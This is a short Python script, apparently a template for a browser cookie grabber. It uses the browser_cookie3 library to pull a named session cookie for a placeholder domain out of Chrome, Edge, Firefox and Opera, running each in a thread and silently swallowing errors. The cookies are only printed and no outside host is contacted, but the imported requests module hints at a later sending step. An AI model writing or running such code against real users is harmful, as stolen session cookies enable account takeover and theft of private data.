import browser_cookie3, requests, threading

def Chrome():
    try:
        cookies = browser_cookie3.chrome(domain_name='DOMAIN')
        cookies = str(cookies)
        cookie = cookies.split('COOKIE=')[1].split(' for .DOMAIN/>')[0].strip()
        print(f'{cookie}')
    except:
        pass

def Edge():
    try:
        cookies = browser_cookie3.edge(domain_name='DOMAIN')
        cookies = str(cookies)
        cookie = cookies.split('COOKIE=')[1].split(' for .DOMAIN/>')[0].strip()
        print(f'{cookie}')
    except:
        pass

def FireFox():
    try:
        cookies = browser_cookie3.firefox(domain_name='DOMAIN')
        cookies = str(cookies)
        cookie = cookies.split('COOKIE=')[1].split(' for .DOMAIN/>')[0].strip()
        print(f'{cookie}')
    except:
        pass

def Opera():
    try:
        cookies = browser_cookie3.opera(domain_name='DOMAIN')
        cookies = str(cookies)
        cookie = cookies.split('COOKIE=')[1].split(' for .DOMAIN/>')[0].strip()
        print(f'{cookie}')
    except:
        pass

browsers = [Edge, Chrome, FireFox, Opera]

for x in browsers:
    threading.Thread(target=x,).start()
